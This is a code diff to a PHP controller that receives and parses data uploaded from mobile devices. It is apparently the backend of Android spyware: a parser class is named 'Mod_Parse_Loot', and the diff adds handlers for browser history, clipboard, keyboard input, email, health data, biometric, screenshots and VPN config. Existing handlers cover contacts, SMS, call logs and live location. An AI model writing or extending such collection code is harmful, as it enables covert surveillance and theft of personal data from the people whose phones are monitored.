@@ -51,6 +51,14 @@ class Receive extends BaseController
         'hardware_graphics', 'hardware_network', 'app_security', 'network_security', 'telephony_network', 'system_locale',
         // Composite extractors
         'misc_software', 'misc_hardware', 'apps_notifications',
+        // Misc software detail extractors
+        'app_permissions', 'browser_history', 'clipboard', 'content_providers',
+        'crash_logs', 'digital_wellbeing', 'doze_standby', 'email', 'health_data',
+        'keyboard_input', 'keyguard', 'screenshots', 'screen_state', 'vpn_config',
+        'running_processes',
+        // Misc hardware detail extractors
+        'audio_devices', 'biometric', 'gnss_hardware', 'power_rails', 'usb_devices',
+        'vibration',
     ];
 
 
@@ -155,19 +163,28 @@ class Receive extends BaseController
             'execution_time_ms' => round((microtime(true) - (defined('APP_START_TIME') ? APP_START_TIME : $_SERVER['REQUEST_TIME_FLOAT'])) * 1000, 2),
         ]);
 
-        // Trigger immediate processing of this specific queue ID in background
+        // Process the queue item immediately (synchronous)
+        $processResult = ['success' => false, 'error' => 'Queue ID was null'];
         if ($queueId !== null) {
-            $this->triggerImmediateProcessing($queueId);
+            $queueModel->markProcessing($queueId);
+            $devicePrintId = $this->request->getPost('device_print_id') ?? '';
+            $processResult = $this->processQueueItemInline($queueId, $queueModel, $fileInfo['category'], $owner, $newName, $devicePrintId);
+            if ($processResult['success']) {
+                $queueModel->markCompleted($queueId);
+            } else {
+                $queueModel->markFailed($queueId, $processResult['error'] ?? 'Processing failed');
+            }
         }
 
         if ($queueId !== null) {
             return $this->respondCreated([
-                'status' => 'queued',
-                'message' => 'File uploaded and queued for processing',
+                'status' => $processResult['success'] ? 'processed' : 'queued',
+                'message' => $processResult['success'] ? 'File uploaded and processed successfully' : 'File uploaded but processing encountered issues, queued for retry',
                 'file_id' => $newName,
                 'file_record_id' => null,
                 'queue_id' => $queueId,
                 'category' => $fileInfo['category'],
+                'record_count' => $processResult['record_count'] ?? 0,
                 'timestamp' => (string) (time() * 1000)
             ]);
         } else {
@@ -289,14 +306,33 @@ class Receive extends BaseController
         ]);
 
         if ($queueId !== null) {
-            $this->triggerImmediateProcessing($queueId);
+            $queueModel->markProcessing($queueId);
+            $result = $this->processQueueItemInline($queueId, $queueModel, $category, $owner, $newName, $devicePrintId);
+
+            if ($result['success']) {
+                $queueModel->markCompleted($queueId);
+                return $this->respondCreated([
+                    'status' => 'processed',
+                    'message' => 'File uploaded and processed successfully',
+                    'file_id' => $newName,
+                    'file_record_id' => null,
+                    'queue_id' => $queueId,
+                    'category' => $category,
+                    'record_count' => $result['record_count'] ?? 0,
+                    'timestamp' => (string) (time() * 1000)
+                ]);
+            }
+
+            $errorMsg = $result['error'] ?? 'Processing failed';
+            $queueModel->markFailed($queueId, $errorMsg);
             return $this->respondCreated([
                 'status' => 'queued',
-                'message' => 'File uploaded and queued for processing',
+                'message' => 'File uploaded but processing failed, queued for retry',
                 'file_id' => $newName,
                 'file_record_id' => null,
                 'queue_id' => $queueId,
                 'category' => $category,
+                'error' => $errorMsg,
                 'timestamp' => (string) (time() * 1000)
             ]);
         }
@@ -704,6 +740,29 @@ class Receive extends BaseController
             'misc_software'      => 'parse_misc_software',
             'misc_hardware'      => 'parse_misc_hardware',
             'apps_notifications' => 'parse_apps_notifications',
+            // Misc software detail extractors
+            'app_permissions'  => 'parse_app_permissions',
+            'browser_history'  => 'parse_browser_history',
+            'clipboard'        => 'parse_clipboard',
+            'content_providers'=> 'parse_content_providers',
+            'crash_logs'       => 'parse_crash_logs',
+            'digital_wellbeing'=> 'parse_digital_wellbeing',
+            'doze_standby'     => 'parse_doze_standby',
+            'email'            => 'parse_email',
+            'health_data'      => 'parse_health_data',
+            'keyboard_input'   => 'parse_keyboard_input',
+            'keyguard'         => 'parse_keyguard',
+            'screenshots'      => 'parse_screenshots',
+            'screen_state'     => 'parse_screen_state',
+            'vpn_config'       => 'parse_vpn_config',
+            'running_processes'=> 'parse_running_processes',
+            // Misc hardware detail extractors
+            'audio_devices'  => 'parse_audio_devices',
+            'biometric'      => 'parse_biometric',
+            'gnss_hardware'  => 'parse_gnss_hardware',
+            'power_rails'    => 'parse_power_rails',
+            'usb_devices'    => 'parse_usb_devices',
+            'vibration'      => 'parse_vibration',
         ];
 
         try {
@@ -847,15 +906,119 @@ class Receive extends BaseController
     /**
      * Trigger immediate processing of a specific queue ID in background.
      */
-    private function triggerImmediateProcessing(int $queueId): void
+    private function processQueueItemInline(int $queueId, Mod_Upload_Queue $queueModel, string $category, int $owner, string $filename, string $devicePrintId): array
     {
-        $sparkPath = FCPATH . 'spark';
-        if (!is_file($sparkPath)) {
-            log_message('warning', 'triggerImmediateProcessing: spark not found at ' . $sparkPath);
-            return;
+        set_time_limit(300);
+        ini_set('memory_limit', '512M');
+
+        try {
+            $parseLoot = new Mod_Parse_Loot();
+            $parseAdv  = new Mod_Parse_Advanced();
+            $uploadedFileModel = new Mod_Uploaded_Files();
+            $startTime = microtime(true);
+
+            $fileRecordId = null;
+            $item = $queueModel->find($queueId);
+            if ($item && !empty($item['file_record_id'])) {
+                $fileRecordId = (int)$item['file_record_id'];
+            }
+
+            $legacyMethodMap = [
+                'contacts' => 'get_contacts',
+                'logs'     => 'get_logs',
+                'calls'    => 'get_logs',
+                'sms'      => 'get_sms',
+                'apps'     => 'get_apps',
+                'files'    => 'get_files',
+                'location'       => 'get_location',
+                'sim_configs'    => 'parse_sim_configs',
+                'sim_config'     => 'parse_sim_configs',
+                'live_locations' => 'parse_live_locations',
+                'live_location'  => 'parse_live_locations',
+            ];
+
+            $advancedMethodMap = [
+                'device'              => 'parse_device_context',
+                'device_context'      => 'parse_device_context',
+                'context'             => 'parse_device_context',
+                'network'             => 'parse_network_info',
+                'network_info'        => 'parse_network_info',
+                'accounts'            => 'parse_accounts',
+                'calendar'            => 'parse_calendar',
+                'app'                 => 'parse_app_usage',
+                'app_usage'           => 'parse_app_usage',
+                'usage'               => 'parse_app_usage',
+                'notifications'       => 'parse_notifications',
+                'bluetooth'           => 'parse_bluetooth',
+                'sensors'             => 'parse_sensors',
+                'sensor'              => 'parse_sensors',
+                'deviceinfo'          => 'parse_device_info',
+                'device_info'         => 'parse_device_info',
+                'security_audit'      => 'parse_security_audit',
+                'securityaudit'       => 'parse_security_audit',
+                'audio'               => 'parse_captured_media',
+                'image'               => 'parse_captured_media',
+                'proc_info'           => 'parse_proc_info',
+                'processes'           => 'parse_processes',
+                'camera_info'         => 'parse_camera_info',
+                'battery_stats'       => 'parse_battery_stats',
+                'accessibility'       => 'parse_accessibility',
+                'input_methods'       => 'parse_input_methods',
+                'cell_towers'         => 'parse_cell_towers',
+                'display_info'        => 'parse_display_info',
+                'storage'             => 'parse_storage',
+                'thermal'             => 'parse_thermal',
+                'nfc'                 => 'parse_nfc',
+                'data_usage'          => 'parse_data_usage',
+                'saved_wifi'          => 'parse_saved_wifi',
+                'default_apps'        => 'parse_default_apps',
+                'alarms'              => 'parse_alarms',
+                'hardware_graphics'   => 'parse_hardware_graphics',
+                'hardware_network'    => 'parse_hardware_network',
+                'app_security'        => 'parse_app_security',
+                'network_security'    => 'parse_network_security',
+                'telephony_network'   => 'parse_telephony_network',
+                'system_locale'       => 'parse_system_locale',
+                'misc_software'       => 'parse_misc_software',
+                'misc_hardware'       => 'parse_misc_hardware',
+                'apps_notifications'  => 'parse_apps_notifications',
+            ];
+
+            if (isset($legacyMethodMap[$category]) && method_exists($parseLoot, $legacyMethodMap[$category])) {
+                $method = $legacyMethodMap[$category];
+                $parsedCountOrBool = $parseLoot->{$method}($filename, $owner, $devicePrintId, $fileRecordId);
+            } elseif (isset($advancedMethodMap[$category])) {
+                $method = $advancedMethodMap[$category];
+
+                if ($method === 'parse_captured_media') {
+                    $parsedCountOrBool = $parseAdv->{$method}($filename, $owner, $devicePrintId, $fileRecordId, $category);
+                } else {
+                    $parsedCountOrBool = $parseAdv->{$method}($filename, $owner, $devicePrintId, $fileRecordId);
+                }
+            } else {
+                log_message('warning', "processQueueItemInline: No handler for category: {$category}");
+                return ['success' => false, 'error' => "No handler for category: {$category}"];
+            }
+
+            $durationMs = round((microtime(true) - $startTime) * 1000, 2);
+
+            if ($parsedCountOrBool === false) {
+                $response = ['success' => false, 'error' => 'Processing failed in parser', 'duration_ms' => $durationMs];
+            } else {
+                $recordCount = is_bool($parsedCountOrBool) ? ($parsedCountOrBool ? 1 : 0) : $parsedCountOrBool;
+                $response = ['success' => true, 'record_count' => $recordCount, 'duration_ms' => $durationMs];
+
+                if ($fileRecordId > 0) {
+                    $uploadedFileModel->updateStatus($fileRecordId, 'processed', $response);
+                }
+            }
+
+            log_message('info', "processQueueItemInline: queue #{$queueId} ({$category}) => " . ($response['success'] ? 'success' : 'failed') . " ({$durationMs}ms)");
+            return $response;
+
+        } catch (\Throwable $e) {
+            log_message('error', "processQueueItemInline: queue #{$queueId} exception: " . $e->getMessage());
+            return ['success' => false, 'error' => $e->getMessage()];
         }
-        $cmd = "nohup php {$sparkPath} queue:process one {$queueId} > " . WRITEPATH . "logs/queue_one_{$queueId}.log 2>&1 &";
-        exec($cmd, $output, $returnVar);
-        log_message('info', "triggerImmediateProcessing: background queue:process one {$queueId} triggered (return={$returnVar})");
     }
 }
